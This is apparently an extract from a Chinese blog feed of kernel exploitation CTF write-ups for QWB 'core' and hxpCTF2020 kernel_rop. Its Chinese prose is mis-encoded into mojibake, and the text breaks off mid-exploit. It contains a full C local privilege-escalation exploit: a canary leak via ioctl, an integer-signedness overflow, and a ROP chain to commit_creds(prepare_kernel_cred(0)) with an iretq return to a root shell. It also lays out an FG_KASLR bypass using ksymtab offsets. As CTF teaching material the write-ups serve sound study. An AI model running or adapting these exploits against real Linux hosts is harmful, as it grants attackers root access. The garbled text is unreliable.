__int64 v3; // rbx v3 = a3; switch ( a2 ) { case 0x6677889B: core_read(a3); break; case 0x6677889C: printk(&amp;unk_2CD); off = v3; break; case 0x6677889A: printk(&amp;unk_2B3); core_copy_func(v3); break; } return 0LL;} int ioctl(int fd, ind cmd, â€¦);æ˜¯è®¾å¤‡é©±åŠ¨ç¨‹åºä¸­å¯¹è®¾å¤‡çš„ioé€šé“è¿›è¡Œç®¡ç†çš„å‡½æ•°ã€‚å…¶ä¸­fdæ˜¯ç”¨æˆ·ç¨‹åºæ‰“å¼€è®¾å¤‡æ—¶ä½¿ç”¨openå‡½æ•°è¿”å›çš„æ–‡ä»¶æ ‡è¯†ç¬¦ï¼Œcmdæ˜¯ç”¨æˆ·ç¨‹åºå¯¹è®¾å¤‡çš„æ§åˆ¶å‘½ä»¤ã€‚ioctlæ˜¯æ–‡ä»¶ç»“æ„ä¸­çš„ä¸€ä¸ªå±æ€§åˆ†é‡ï¼Œå¦‚æœä½ çš„é©±åŠ¨ç¨‹åºæä¾›äº†å¯¹ioctlçš„æ”¯æŒï¼Œç”¨æˆ·å°±å¯ä»¥åœ¨ç”¨æˆ·ç¨‹åºä¸­ä½¿ç”¨ioctlå‡½æ•°å®ç°å¯¹è®¾å¤‡ioé€šé“çš„æ§åˆ¶ã€‚æ„æ€å°±æ˜¯å¦‚æœlkmä¸­æä¾›äº†ioctlåŠŸèƒ½ï¼ˆæ¯”å¦‚ä¸Šé¢çš„è¿™ä¸ªå‡½æ•°ï¼‰ï¼Œå¹¶ä¸”å®ç°äº†å¯¹åº”æŒ‡ä»¤çš„æ“ä½œï¼Œé‚£ä¹ˆåœ¨ç”¨æˆ·æ€ä¸­ï¼Œé€šè¿‡è¿™ä¸ªé©±åŠ¨ç¨‹åºï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ioctlå‡½æ•°æ¥ç›´æ¥è°ƒç”¨æ¨¡å—ä¸­çš„æ“ä½œã€‚ è€Œè¿™é‡Œå°±æä¾›äº†ioctlåŠŸèƒ½ï¼Œç»§ç»­åˆ†æcore_read()ã€‚ 12345678910111213141516171819202122232425unsigned __int64 __fastcall core_read(__int64 a1){ __int64 v1; // rbx __int64 *v2; // rdi __int64 i; // rcx unsigned __int64 result; // rax __int64 v5; // [rsp+0h] [rbp-50h] unsigned __int64 v6; // [rsp+40h] [rbp-10h] v1 = a1; v6 = __readgsqword(0x28u); printk(&amp;unk_25B); printk(&amp;unk_275); v2 = &amp;v5; for ( i = 16LL; i; --i ) { *(_DWORD *)v2 = 0; v2 = (__int64 *)((char *)v2 + 4); } strcpy((char *)&amp;v5, &quot;Welcome to the QWB CTF challenge.\\n&quot;); result = copy_to_user(v1, (char *)&amp;v5 + off, 64LL); if ( !result ) return __readgsqword(0x28u) ^ v6; __asm { swapgs } return result; copy_to_user()å‡½æ•°ä¸­å°†v5+offä¸­çš„0x40é•¿åº¦çš„æ•°æ®æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå…¶ä¸­offæ˜¯bssä¸Šçš„å…¨å±€å˜é‡ã€‚ è€Œcase 0x6677889Cå°±ç»™äº†æˆ‘ä»¬æ§åˆ¶offçš„æœºä¼šï¼Œå› æ­¤æˆ‘ä»¬åˆ©ç”¨é€šè¿‡æ§åˆ¶off=0x40æ¥leak canaryã€‚ core_copy_funcå‡½æ•°ï¼š 1234567891011121314151617181920 __int64 __fastcall core_copy_func(__int64 a1){ __int64 result; // rax __int64 v2; // [rsp+0h] [rbp-50h] unsigned __int64 v3; // [rsp+40h] [rbp-10h] v3 = __readgsqword(0x28u); printk(&amp;unk_215); if ( a1 &gt; 63 ) { printk(&amp;unk_2A1); result = 0xFFFFFFFFLL; } else { result = 0LL; qmemcpy(&amp;v2, &amp;name, (unsigned __int16)a1); } return result;}é¦–å…ˆå¯¹é•¿åº¦è¿›è¡Œäº†æ£€æŸ¥ï¼Œä½†æ³¨æ„æ•°æ®ç±»å‹ï¼Œa1ä¸ºint64ï¼Œè€Œåœ¨qmemcpyå‡½æ•°é‡Œç±»å‹äº†uint16ï¼Œå› æ­¤æˆ‘ä»¬è®¾è®¡a1ä¸º0xffffffff00000000|(real_len)ä½¿int64ä¸ºè´Ÿæ•°ï¼Œä»è€Œç»•è¿‡æ£€æŸ¥çš„åŒæ—¶é€ æˆæº¢å‡ºã€‚ è¿™æ ·åˆ†æä¸‹æ¥åˆ©ç”¨æ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼šå…ˆåˆ©ç”¨core_read()æ³„éœ²canaryï¼Œä¹‹åå†åˆ©ç”¨core_cpoy_funcåœ¨å†…æ ¸æ ˆé‡Œæ„é€ ropï¼Œä½¿å…¶åœ¨å†…æ ¸æ€æ‰§è¡Œcommit_creds(prepare_kernel_cred(0))ä½¿å¾—è¿›ç¨‹çš„uidgid=0ï¼Œç„¶åè¿”å›åˆ°ç”¨æˆ·æ€æ‰§è¡Œsystem(â€œ/bin/sh)ä»è€Œå®Œæˆææƒã€‚ éš¾ç‚¹åœ¨äºropçš„æ„é€ ã€‚å¯¹äºæ‰§è¡Œcommit_creds(prepare_kernel_cred(0))æ¥è¯´ï¼Œä¼ å‚å’Œç”¨æˆ·æ€çš„ä¸€è‡´ï¼Œä½†è¦æ³¨æ„commit_creds()çš„å‚æ•°æ˜¯prepare_kernel_cred(0)å‡½æ•°çš„è¿”å›å€¼ã€‚ä»å†…æ ¸æ€è¿”å›ç”¨æˆ·æ€æ—¶è¦ç”¨åˆ°æ¡æŒ‡ä»¤swapgså’Œiretqã€‚åœ¨æ‰§è¡Œiretqä¹‹å‰ï¼Œæ‰§è¡ŒswapgsæŒ‡ä»¤ã€‚è¯¥æŒ‡ä»¤é€šè¿‡ç”¨ä¸€ä¸ªMSRä¸­çš„å€¼äº¤æ¢GSå¯„å­˜å™¨çš„å†…å®¹ï¼Œç”¨æ¥è·å–æŒ‡å‘å†…æ ¸æ•°æ®ç»“æ„çš„æŒ‡é’ˆï¼Œç„¶åæ‰èƒ½æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ä¹‹ç±»çš„å†…æ ¸ç©ºé—´ç¨‹åºã€‚ iret(ç‰¹æƒè¿”å›)æŒ‡ä»¤ä»å†…æ ¸ç©ºé—´è¿”å›åˆ°ç”¨æˆ·ç©ºé—´è¿›ç¨‹ã€‚ä½†æ˜¯iret(64ä½ä¸‹ä¸ºiretq)æœŸæœ›çš„ç‰¹å®šçš„å †æ ˆå¸ƒå±€å¦‚ä¸‹æ‰€ç¤ºï¼š 12345678910111213|----------------------|| iretq_ret ||----------------------|| RIP |&lt;== low mem|----------------------|| CS ||----------------------|| EFLAGS ||----------------------|| RSP ||----------------------|| SS |&lt;== high mem|----------------------| æ–°çš„ç”¨æˆ·ç©ºé—´æŒ‡ä»¤æŒ‡é’ˆ(RIP)ï¼Œç”¨æˆ·ç©ºé—´å †æ ˆæŒ‡é’ˆ(RSP)ï¼Œä»£ç å’Œå †æ ˆæ®µé€‰æ‹©å™¨(CSå’ŒSS)ä»¥åŠå…·æœ‰å„ç§çŠ¶æ€ä¿¡æ¯çš„EFLAGSå¯„å­˜å™¨ã€‚ä¸€èˆ¬æˆ‘ä»¬ç”¨ä»¥ä¸‹çš„æ‰©å±•å†…è”æ±‡ç¼–è·å¾—æ‰€éœ€çš„å¯„å­˜å™¨çš„å€¼ï¼š 1234567891011121314void save_status(){ asm( &quot; mov %%cs, %0\\n&quot; &quot;mov %%ss,%1\\n&quot; &quot;mov %%rsp,%3\\n&quot; &quot;pushfq\\n&quot; &quot;popq %2&quot; :&quot;=r&quot;(tf.cs),&quot;=r&quot;(tf.ss),&quot;=r&quot;(tf.rflags),&quot;=r&quot;(tf.rsp) //output : //input :&quot;memory&quot; //list of clobbered registerså³æ”¹å˜çš„å†…å®¹ ); tf.rsp -= 4096; tf.rip = &amp;launch_shell;} ropï¼š 123456789101112131415161718192021222324252627282930313233343536pwndbg&gt; stack 5000:0000â”‚ rsp 0xffffa47a800e7e60 â€”â–¸ 0x7ffec40e5570 â—‚â€” add byte ptr [rcx - 0x70], dl /* 0x44777d3bde905100 */01:0008â”‚ 0xffffa47a800e7e68 â€”â–¸ 0xffffffffb2200b2f â—‚â€” pop rdi /* 0x722540358b4cc35f */02:0010â”‚ 0xffffa47a800e7e70 â—‚â€” 003:0018â”‚ 0xffffa47a800e7e78 â€”â–¸ 0xffffffffb229cce0 â—‚â€” push rbp /* 0x153d8b48fd894855 */04:0020â”‚ 0xffffa47a800e7e80 â€”â–¸ 0xffffffffb2221e53 â—‚â€” pop rcx /* 0xffdf89480127c359 */05:0028â”‚ 0xffffa47a800e7e88 â€”â–¸ 0xffffffffb229c8e0 â—‚â€” push r12 /* 0x4025248b4c655441 */06:0030â”‚ 0xffffa47a800e7e90 â€”â–¸ 0xffffffffb23ae978 â—‚â€” mov rdi, rax /* 0xc28ee9e1ffc78948 */07:0038â”‚ 0xffffa47a800e7e98 â€”â–¸ 0xffffffffb2c012da â—‚â€” swapgs /* 0x485590c39df8010f */08:0040â”‚ 0xffffa47a800e7ea0 â—‚â€” 009:0048â”‚ 0xffffa47a800e7ea8 â€”â–¸ 0xffffffffb2250ac2 â—‚â€” iretq /* 0x1f0f2e6690c3cf48 */0a:0050â”‚ 0xffffa47a800e7eb0 â€”â–¸ 0x400eac â—‚â€” push rbp0b:0058â”‚ 0xffffa47a800e7eb8 â—‚â€” 0x33 /* '3' */0c:0060â”‚ 0xffffa47a800e7ec0 â—‚â€” 0x2820d:0068â”‚ 0xffffa47a800e7ec8 â€”â–¸ 0x7ffec40e45c0 â—‚â€” 00e:0070â”‚ 0xffffa47a800e7ed0 â—‚â€” 0x2b /* '+' */0f:0078â”‚ 0xffffa47a800e7ed8 â—‚â€” 0*(ptr + i++) = canary;*(ptr + i++) = rbp;*(ptr + i++) = prdi_ret;*(ptr + i++) = 0;*(ptr + i++) = prepare_kernel_cred;*(ptr + i++) = prcx_ret;*(ptr + i++) = commit_creds;*(ptr + i++) = mov_rdi_rax_jmp_rcx;*(ptr + i++) = swapgs_p_ret;*(ptr + i++) = 0;*(ptr + i++) = iretq_ret;*(ptr + i++) = (uint64_t) launch_shell;*(ptr + i++) = tf.cs;*(ptr + i++) = tf.rflags;*(ptr + i++) = tf.rsp;*(ptr + i++) = tf.ss; exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;inttypes.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdbool.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;struct trap_frame{c void *rip; uint64_t cs; uint64_t rflags; void * rsp; uint64_t ss;}__attribute__((packed));struct trap_frame tf;uint64_t kernel_base=0;uint64_t commit_creds=0;uint64_t prepare_kernel_cred = 0;uint64_t commit_creds_offset = 0x9c8e0;uint64_t prepare_kernel_cred_offset = 0x9cce0;uint64_t canary = 0;uint64_t rbp = 0;uint64_t prdi_ret = 0x0b2f; //: pop rdi; ret;uint64_t mov_rdi_rax_jmp_rcx = 0x1ae978; //: mov rdi, rax; jmp rcx;uint64_t mov_rdi_rax_jmp_rdx = 0x6a6d2; //: mov rdi, rax; jmp rdx;uint64_t prcx_ret = 0x21e53; //: pop rcx; ret;uint64_t swapgs_p_ret = 0xa012da; //: swapgs; popfq; ret;uint64_t iretq_ret = 0x50ac2; //: iretq; ret;bool get_kernel_base(){ FILE *fd; uint64_t kernel_base1=0,kernel_base2=0; fd=fopen(&quot;/tmp/kallsyms&quot;,&quot;rb&quot;); char line[0x30]; if(fd&lt;0){ die(&quot;open kallsyms fialed&quot;); } while(1){ fgets(line,0x30,fd); if(kernel_base!=0){ return true; } if(strstr(line,&quot;commit_creds&quot;)&amp;&amp;!commit_creds){ getchar(); sscanf(line,&quot;%llx&quot;,&amp;commit_creds); printf(&quot;commit_creds addr: %p\\n&quot;,commit_creds); kernel_base1=commit_creds-commit_creds_offset; } if(strstr(line,&quot;prepare_kernel_cred&quot;)&amp;&amp;!prepare_kernel_cred){ getchar(); sscanf(line,&quot;%llx&quot;,&amp;prepare_kernel_cred); printf(&quot;prepare_kernel_cred addr: %p\\n&quot;,prepare_kernel_cred); kernel_base2=prepare_kernel_cred-prepare_kernel_cred_offset; } if(kernel_base1!=0&amp;&amp;kernel_base1==kernel_base2){ kernel_base=kernel_base1; } }}void leak(int fd){ ioctl(fd,0x6677889C,0x40); uint8_t buffer[0x40]; ioctl(fd,0x6677889B,buffer); canary=*(uint64_t *)buffer; rbp=*(uint64_t *)(buffer+8); printf(&quot;canary: %p\\n&quot;,canary);}void set_gadget_addr(){ prdi_ret += kernel_base; prcx_ret += kernel_base; mov_rdi_rax_jmp_rcx += kernel_base; mov_rdi_rax_jmp_rdx += kernel_base; swapgs_p_ret += kernel_base; iretq_ret += kernel_base; return ;}void launch_shell();void save_status(){ asm( &quot; mov %%cs, %0\\n&quot; &quot;mov %%ss,%1\\n&quot; &quot;mov %%rsp,%3\\n&quot; &quot;pushfq\\n&quot; &quot;popq %2&quot; :&quot;=r&quot;(tf.cs),&quot;=r&quot;(tf.ss),&quot;=r&quot;(tf.rflags),&quot;=r&quot;(tf.rsp) : :&quot;memory&quot; ); tf.rsp -= 4096; tf.rip = &amp;launch_shell;}void launch_shell(){ execl(&quot;/bin/sh&quot;,&quot;sh&quot;,NULL);}int main(){ bool ret = get_kernel_base(); int i = 0; uint8_t buffer[0x800] = {0}; int fd = open(&quot;/proc/core&quot;,O_RDWR); leak(fd); set_gadget_addr(); save_status(); uint64_t *ptr; ptr = (uint64_t *)(buffer+0x40); *(ptr + i++) = canary; *(ptr + i++) = rbp; *(ptr + i++) = prdi_ret; *(ptr + i++) = 0; *(ptr + i++) = prepare_kernel_cred; *(ptr + i++) = prcx_ret; *(ptr + i++) = commit_creds; *(ptr + i++) = mov_rdi_rax_jmp_rcx; *(ptr + i++) = swapgs_p_ret; *(ptr + i++) = 0; *(ptr + i++) = iretq_ret; *(ptr + i++) = (uint64_t) launch_shell; *(ptr + i++) = tf.cs; *(ptr + i++) = tf.rflags; *(ptr + i++) = tf.rsp; *(ptr + i++) = tf.ss; write(fd,buffer,0x800); uint64_t len=0xffffffff00000000; uint32_t l=0x100; len|=l; ioctl(fd,0x6677889A,len); return 0;} ä¸€ç‚¹è¡¥å……ï¼šé™æ€ç¼–è¯‘exp(å†…æ ¸æ²¡æœ‰cåº“):gcc exp.c -static -o exploit æŸ¥æ‰¾gadgetæŒ‡ä»¤ï¼šROPgadget --binary vmlinux &gt; ropgadget è°ƒè¯•æ–¹æ³•ï¼š.shè„šæœ¬é‡Œæœ‰-sæˆ‘ä»¬å¯ä»¥é€šè¿‡ 123gdb ./vmlinuxtarget remote:1234add-symbol-file core.ko 0xffffffffc0000000 (è¯¥textçš„åŸºåœ°å€é€šè¿‡cat /sys/module/core/sections/.textå¾—åˆ°) è¿™æ ·å°±å¯ä»¥ç›´æ¥æ ¹æ®æ¨¡å—é‡Œçš„å‡½æ•°åä¸‹æ–­äº†ã€‚ ä½†åˆä¸€ç‚¹å¾ˆç–‘æƒ‘çš„æ—¶pwngdbè°ƒå†…æ ¸ç©ºé—´å·¨å¡ï¼Œè€Œä¸”si/niç›´æ¥è·‘é£äº†ğŸ¤¦ï¼Œåªèƒ½ä¸‹æ–­ç‚¹å†cè¿™æ ·è°ƒï¼Œruanå¸ˆå‚…è¯´gefè°ƒèµ·æ¥å¾ˆå¿«ï¼Œå¾—å†å»æä¸ªgefæ¥ã€‚ å‚è€ƒåšå®¢ï¼ˆæ„Ÿè°¢ï¼‰ï¼šhttps://f5.pm/go-26809.htmlhttps://www.cnblogs.com/T1e9u/p/13805760.htmlhttps://www.freebuf.com/articles/system/227357.html","link":"/2020/11/07/kernel_pwn(1)/"},{"title":"Kernel_pwn FG_KASLR in ROP","text":"Kernel_pwn FG_KASLR in ROP ç¬¬ä¸€æ¬¡é‡åˆ°FG_KASLRæœºåˆ¶ï¼Œç®—æ˜¯KASLRçš„åŠ å¼ºç‰ˆï¼ŒåŠ å¤§äº†ä¸€äº›ROPçš„éš¾åº¦ï¼Œä½†ä»æœ‰bypassçš„æ–¹æ³•ã€‚é¢˜ç›®æ¥è‡ªhxpCTF2020 kernel_ropã€‚ FG_KASLRé¦–å…ˆäº†è§£ä¸‹FG_KASLRï¼šå…¨ç§°æ˜¯Function Granular KASLRï¼Œè¯‘ä¸ºå‡½æ•°é¢—ç²’åŒ–åœ°å€éšæœºåˆ†å¸ƒã€‚æˆ‘ä»¬çŸ¥é“ï¼Œå¼€å¯ä¸€èˆ¬çš„KASLRä¼šä½¿å¾—æ¯æ¬¡ç›®æ ‡æ–‡ä»¶åŠ è½½åˆ°çš„å†…å­˜èµ·å§‹åœ°å€ä¼šéšæœºåŒ–ï¼Œä½†åªè¦èƒ½leakä¸€ä¸ªåœ¨ç›¸åº”å†…å­˜åŒºåŸŸçš„åœ°å€ï¼Œæˆ‘ä»¬å°±èƒ½é€šè¿‡å…¶offsetå›ºå®šçš„åŸå› å¾—åˆ°ä»»ä½•ä¸€ä¸ªåœ¨æ­¤å†…å­˜åŒºåŸŸçš„åœ°å€ã€‚ æ–‡æ¡£å¯¹FG_KASLRæè¿°ä¸º: 1234This patch set is an implementation of finer grained kernel address spacerandomization. It rearranges your kernel code at load time on a per-function level granularity, with only around a second added toboot time. å’ŒKASLRä¸åŒï¼ŒFG_KASLRåšäº†æ›´éšæœºåŒ–ã€‚å®ƒåœ¨loadçš„æ—¶å€™æŒ‰ç…§å‡½æ•°çº§åˆ«çš„ç»†ç²’åº¦æ¥é‡æ’å†…æ ¸ä»£ç ï¼Œè¿™æ ·åšå®ƒçš„boot timeå¢åŠ äº†1ç§’ï¼Œä½†ä½¿å¾—æˆ‘ä»¬é€šè¿‡offsetçš„æ–¹æ³•å¾—åˆ°çœŸå®åœ°å€çš„æ–¹æ³•â€ç ´ç­â€œã€‚å³ä½¿æˆ‘ä»¬leakå‡ºäº†ä¸€ä¸ªåœ¨.textæ®µçš„åœ°å€ï¼Œä½†FG_KASLRæ˜¯å‡½æ•°çº§ä¸Šçš„éšæœºåŒ–ï¼Œå¯¹å‡½æ•°çš„é‡æ’ä½¿å¾—offsetä¹Ÿå˜å¾—éšæœºåŒ–ï¼Œæˆ‘ä»¬ä¹Ÿå°±æ— æ³•é€šè¿‡leak_addr+offsetæ¥ç¡®å®šåœ°å€äº†ã€‚ è¿™æ˜¯æˆ‘ä¸€å¼€å§‹çœ‹åˆ°è¿™ä¸ªæœºåˆ¶çš„æƒ³æ³•ï¼Œä½†å½“æˆ‘åšåˆ°ä¸€é“å¼€äº†FG_KASLRçš„kernel_pwnä¹‹åï¼Œæ‰å‘ç°æˆ‘too yuang too simpleäº†ã€‚ hxpCTF2020 kernel_ropæ‹¿åˆ°é¢˜ç›®åå‘ç°å†…æ ¸ç‰ˆæœ¬ä¸ºvmlinuz: Linux kernel x86 boot executable bzImage, version 5.9.0-rc6+ç®—æ˜¯æ¯”è¾ƒæ–°äº†ã€‚ æ¥ç€æŸ¥çœ‹etc/init.d/é‡Œçš„rcSåˆå§‹åŒ–è„šæœ¬çœ‹åˆ°insmodäº†hackme.koï¼Œåº”è¯¥å°±æ˜¯æœ‰æ¼æ´çš„æ¨¡å—äº†ã€‚ æ¨¡å—æä¾›äº†hackme_read()å’Œhackme_write()åŠŸèƒ½ï¼Œæ¼æ´åœ¨writeåŠŸèƒ½é‡Œï¼š 123456789101112131415161718192021ssize_t __fastcall hackme_write(file *f, const char *data, size_t size, loff_t *off){ unsigned __int64 v4; // rdx ssize_t v5; // rbx int tmp[32]; // [rsp+0h] [rbp-A0h] BYREF unsigned __int64 v8; // [rsp+80h] [rbp-20h] _fentry__(); v5 = v4; v8 = __readgsqword(0x28u); if ( v4 &gt; 0x1000 ) { _warn_printk(&quot;Buffer overflow detected (%d &lt; %lu)!\\n&quot;, 4096LL); BUG(); } _check_object_size(hackme_buf, v4, 0LL); if ( copy_from_user(hackme_buf, data, v5) ) return -14LL; _memcpy(tmp, hackme_buf, v5); return v5;} _memcpy(tmp, hackme_buf, v5);é€ æˆæ ˆæº¢å‡ºã€‚å› æ­¤åˆ©ç”¨æ–¹æ³•å°±æ¯”è¾ƒæ˜ç¡®äº†ï¼Œå…ˆåˆ©ç”¨readåŠŸèƒ½leakåœ°å€ï¼Œæ‰¾gadgetsï¼Œä¹‹åropæ‰§è¡Œcommit_creds(prepare_kernel_cred(0))ææƒã€‚ é¦–å…ˆleakåœ°å€ï¼š 1read(global_fd, leak, sizeof(leak)); ä¼ å…¥ä¸€ä¸ªleakæ•°ç»„ï¼Œçœ‹ä¸‹éƒ½è¯»åˆ°äº†å•¥ï¼š 123456789101112131415161718192021222324252627282930313233343536373839400: 0xffff888007201020 1: 0xfe02: 0x71e8e82fd1c6c6003: 0xffff88800647b2104: 0xffffc900001c7e685: 0x46: 0xffff88800647b2007: 0xffffc900001c7ef08: 0xffff88800647b2009: 0xffffc900001c7e8010: 0xffffffff8184e04711: 0xffffffff8184e04712: 0xffff88800647b20013: (nil)14: 0x7fff6f10583015: 0xffffc900001c7ea016: 0x71e8e82fd1c6c60017: 0x14018: (nil)19: 0xffffc900001c7ed820: 0xffffffff816d51ff21: 0xffff88800647b20022: 0xffff88800647b20023: 0x7fff6f10583024: 0x14025: (nil)26: 0xffffc900001c7f2027: 0xffffffff816d572728: 0xffffffff8152b8a129: (nil)30: 0x71e8e82fd1c6c60031: 0xffffc900001c7f5832: (nil)33: (nil)34: (nil)35: 0xffffc900001c7f3036: 0xffffffff816d577a37: 0xffffc900001c7f4838: 0xffffffff8100a15739: (nil) å¤šé‡å¤leakå‡ æ¬¡åä¼šå‘ç°leak[38]å¤„çš„0xffffffff8100a157æ˜¯æ²¡å˜åŒ–çš„ï¼Œè€Œä¸”è¿™ä¸ªåœ°å€æ˜¯kernel imageé‡Œçš„åœ°å€ï¼Œå› æ­¤é€šè¿‡è¿™ä¸ªåœ°å€æˆ‘ä»¬å®¹æ˜“å¾—åˆ°image_baseçš„åœ°å€ã€‚æ¥ç€æˆ‘ä»¬å…ˆæ‰‹åŠ¨rootä¸‹ï¼Œé€šè¿‡/proc/kallsymså»æ‰¾æ‰¾å‡½æ•°åœ°å€ 123456789101112131415161738: 0xffffffffa820a157 39: (nil) image base: 0xffffffffa8200000/ # cat /proc/kallsyms | grep &quot;commit_creds&quot;ffffffffa8c93f90 T commit_credsffffffffa9187d90 r __ksymtab_commit_credsffffffffa91a0972 r __kstrtab_commit_credsffffffffa91a4d42 r __kstrtabns_commit_creds38: 0xffffffffb260a15739: (nil)image base: 0xffffffffb2600000/ # cat /proc/kallsyms | grep &quot;commit_creds&quot;ffffffffb2a2e6c0 T commit_credsffffffffb3587d90 r __ksymtab_commit_credsffffffffb35a0972 r __kstrtab_commit_credsffffffffb35a4d42 r __kstrtabns_commit_creds ä¸Šé¢æ˜¯ä¸¤æ¬¡å¯åŠ¨qemuåå…ˆleakåœ°å€åœ¨é€šè¿‡/proc/kallsymsæŸ¥çœ‹å‡½æ•°åœ°å€å¾—åˆ°çš„ç»“æœã€‚commit_credså‡½æ•°å’Œimage_baseçš„offsetåˆ†åˆ«ä¸º0xa93f90å’Œ0x42e6c0ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡image_base+offsetæ¥å¾—åˆ°commit_creds()çš„åœ°å€ï¼Œè¿™ä¹Ÿæ˜¯å¼€å¯äº†FG_KASLRçš„æ•ˆæœã€‚ ä½†åœ¨è®¡ç®—__ksymtab_commit_credså’Œimage_baseçš„åç§»æ—¶å‘ç°ï¼š 1234&gt;&gt;&gt; hex(0xffffffffa9187d90-0xffffffffa8200000)'0xf87d90L'&gt;&gt;&gt; hex(0xffffffffb3587d90-0xffffffffb2600000)'0xf87d90L' offsetæ˜¯å›ºå®šçš„ã€‚å¯ä»¥çœ‹åˆ°ï¼ŒFG_KASLRå¹¶æ²¡æœ‰åšåˆ°Kernelåœ°å€çš„å®Œå…¨éšæœºåŒ–ï¼Œæ²¡æœ‰å—åˆ°å½±å“çš„åŒºåŸŸå¦‚ä¸‹ï¼š 1ã€å­˜åœ¨äº.text_baseåˆ°__x86_retpoline_r15(.text+400dc6)çš„å‡½æ•°æ²¡æœ‰å—åˆ°å½±å“ã€‚æ˜¾ç„¶commit_credså’Œprepare_kernel_cred()æ²¡æœ‰åŒ…å«åœ¨å†…ï¼Œä½†æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥åœ¨è¿™é‡Œæ‰¾ä¸€äº›gadgetçš„ã€‚ 2ã€KPIT trampolineswapgs_restore_regs_and_return_to_usermode()æ²¡æœ‰å—åˆ°å½±å“ã€‚ 3.å†…æ ¸ç¬¦å·è¡¨(kernel symbol table)ksymtabå¼€å§‹äº.text+0xf85198æ²¡æœ‰å—åˆ°å½±å“ã€‚ è¿™ä¹Ÿè¯´æ˜äº†æˆ‘ä»¬è®¡ç®—__ksymtab_commit_credsçš„åç§»å›ºå®šçš„åŸå› ã€‚ksymtabçš„ç»“æ„å¦‚ä¸‹ 12345struct kernel_symbol { int value_offset; int name_offset; int namespace_offset;}; å…¶ä¸­value_offsetæ˜¯ksymtabåˆ°å¯¹åº”å‡½æ•°çš„åç§»ï¼Œä»¥commit_credså‡½æ•°ä¸ºä¾‹å°±æ˜¯__ksymtab_commit_creds + value_offset = commit_credsã€‚ ä½¿ç”¨åˆ°çš„gadgetsæœ‰ï¼š 123pop_rax_ret = image_base + 0x4d11;mov_eax_ind_rax_ret = image_base + 0x4aae;pop_rdi_ret = image_base + 0x38a0; æ€è·¯å¦‚ä¸‹ï¼š 1ã€é€šè¿‡readåŠŸèƒ½leakå‡ºimage_baseå’Œstacké‡Œçš„cookieï¼Œåˆ†åˆ«å¯¹åº”leak[38]å’Œleak[2]ã€‚ 2ã€é€šè¿‡image_base+offsetè®¡ç®—__ksymtab_commit_credsï¼Œ__ksymtab_prepare_kernel_cred()ä»¥åŠgadgetsåœ°å€ã€‚ 3ã€æ„é€ ROPï¼Œåˆ©ç”¨gadgetå°†ksymtabçš„value_offsetå­˜æ”¾raxï¼Œå†åˆ©ç”¨KPTI trampolineè¿”å›userlandå¾—åˆ°å…¶å€¼ï¼Œè®¡ç®—å¾—çœŸå®å‡½æ•°åœ°å€ï¼Œå†åšä¸€æ¬¡ç±»ä¼¼çš„ROPä»è€Œå¾—åˆ°commit_creds()å’Œprepare_kernel_cred()å‡½æ•°åœ°å€ã€‚ 4ã€ç”±äºæœ‰KPTIè€Œä¸”æˆ‘ä»¬çš„gadgeté‡Œæ²¡æœ‰èƒ½ç±»ä¼¼mov rdi, raxçš„åŠŸèƒ½ï¼Œåªèƒ½åˆ†è§£åˆ©ç”¨çš„è¿‡ç¨‹ã€‚æˆ‘ä»¬çš„ROPåº”ä½¿ç”¨KPTI trampolineå°†ææƒåˆ†æˆä¸¤ä¸ªstageï¼š1.ROPæ‰§è¡Œprepare_kernel_cred(0),æ‰§è¡Œç»“æœäºraxï¼Œåˆ©ç”¨KPTI trampolineè¿”å›userlandå¾—åˆ°raxå€¼(å³cred_struct_va)ã€‚2.ROPæ‰§è¡Œcommit_cred(cred_struct_va)ï¼Œåˆ©ç”¨KPTI trampolineè¿”å›userlandæ‰§è¡Œsystem('/bin/sh');ã€‚ exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;sched.h&gt;#include &lt;sys/mman.h&gt;#include &lt;signal.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;sys/wait.h&gt;#include &lt;poll.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;inttypes.h&gt;uint64_t user_cs, user_ss, user_rflags, user_sp;int global_fd;char flag_buf[256];uint64_t cookie;uint64_t image_base;uint64_t swapgs_restore_regs_and_ret_to_uspace; // start after popping raxuint64_t zero_rax_ret; // xor eax, eax; ret;uint64_t write_mem_ret; // mov qword ptr [rbx], rax; pop rbx; pop rbp; ret;uint64_t pop_rax_ret; // pop rax; retuint64_t mov_eax_ind_rax_ret; // mov eax, qword ptr [rax + 0x10]; pop rbp; ret;uint64_t pop_rdi_ret; // pop rdi; pop rbp; ret;uint64_t ksymtab_prepare_kernel_cred;uint64_t ksymtab_commit_creds;uint64_t prepare_kernel_cred;uint64_t commit_creds;uint64_t creds_struct_va;enum current_state{ current_state_read_ksymtab_prepare_kernel_cred, current_state_read_ksymtab_commit_creds, current_state_escalate_privileges_stage1, current_state_escalate_privileges_stage2,};void safe_exit(void);int open_dev(){ int fd = open(&quot;/dev/hackme&quot;, O_RDWR); if(fd &lt; 0){ printf(&quot;open faild!&quot;); exit(1); } return fd;}void save_state(void){ asm( &quot;movq %%cs, %0\\n&quot; &quot;movq %%ss, %1\\n&quot; &quot;movq %%rsp, %3;\\n&quot; &quot;pushfq\\n&quot; &quot;pop %2\\n&quot; : &quot;=r&quot;(user_cs), 